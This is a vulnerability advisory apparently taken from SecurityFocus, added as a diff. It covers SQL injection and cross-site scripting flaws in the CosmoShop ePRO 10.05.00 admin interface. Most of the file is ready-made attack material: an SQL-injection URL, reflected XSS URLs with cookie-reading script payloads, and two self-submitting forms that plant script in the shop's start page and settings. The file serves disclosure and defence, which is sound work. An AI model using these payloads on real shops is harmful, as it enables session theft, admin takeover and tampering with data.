@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/46828/info
+
+CosmoShop is prone to multiple cross-site scripting vulnerabilities and an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+CosmoShop ePRO V10.05.00 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/cgi-bin/admin/index.cgi?action=menu&id=eco'+SQL_CODE&hId=eco
+
+<form action="http://www.example.com/cgi-bin/admin/edit_startseitentext.cgi" method="post" name="main" enctype="multipart/form-data">
+<input type="hidden" name="setup" value="allgemein">
+<input type="hidden" name="action" value="save">
+<input type="hidden" name="use_wwe" value="1">
+<input type="hidden" name="file-de" value="startseitentext_de.txt">
+<input type="hidden" name="text-de" value='page html"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
+http://www.example.com/cgi-bin/admin/rubrikadmin.cgi?action=edit&rubnum=angebote&rcopy="><script>alert(document.cookie)</script>&expand=,angebote
+
+http://www.example.com/cgi-bin/admin/artikeladmin.cgi?action=artikelsuche&typ=bearbeiten"><script>alert(document.cookie)</script>&hId=daten.artikel
+
+http://www.example.com/cgi-bin/admin/shophilfe_suche.cgi?sprache=de&suchbegriff=1"><script>alert(document.cookie)</script>
+
+
+<form action="http://www.example.com/cgi-bin/admin/setup_edit.cgi" method="post" name="main">
+
+<input type="hidden" name="setup" value="allgemein">
+<input type="hidden" name="hId" value="setup.einstellungen.allgemein">
+<input type="hidden" name="setup_key" value="allgemein">
+<input type="hidden" name="shoptitel" value="Cosmoshop Shopsoftware 10.x">
+<input type="hidden" name="shopbetreiber" value="email@example.com">
+<input type="hidden" name="shop_bestellempfaenger" value="email@example.com">
+<input type="hidden" name="anfrage_mail" value="email@example.com">
+<input type="hidden" name="shop_umstid" value="DE12345678">
+<input type="hidden" name="shop_eg" value="1">
+<input type="hidden" name="auftragszaehler" value="1">
+<input type="hidden" name="hauptwaehrung" value='EUR"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="nebenwaehrung" value="$">
+<input type="hidden" name="eurofaktor" value="0.7">
+<input type="hidden" name="mindestpreisdm" value="10">
+<input type="hidden" name="emis_bestellempfaenger" value="">
+<input type="hidden" name="afs_bestellempfaenger" value="">
+<input type="hidden" name="ean_in_ausf" value="1">
+<input type="hidden" name="google_verify_code" value="">
+<input type="hidden" name="save_it" value="abspeichern">
+
+</form>
+<script>
+document.main.submit();
+</script>
